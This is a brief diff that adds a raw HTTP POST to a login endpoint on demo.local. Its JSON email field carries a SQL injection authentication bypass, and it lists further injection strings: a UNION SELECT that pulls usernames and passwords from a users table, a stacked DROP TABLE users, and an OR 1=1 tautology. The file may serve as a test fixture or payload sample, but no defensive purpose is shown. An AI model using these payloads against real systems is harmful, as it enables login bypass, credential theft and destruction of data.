@@ -1,0 +1,10 @@
+POST /api/v1/login HTTP/1.1
+Host: demo.local
+Content-Type: application/json
+
+{"email": "admin' OR 1=1 -- ", "password": "x"}
+
+# Additional injection attempts in the same request body
+username=' UNION SELECT username, password FROM users --
+search=test'; DROP TABLE users; --
+filter=1 OR 1=1
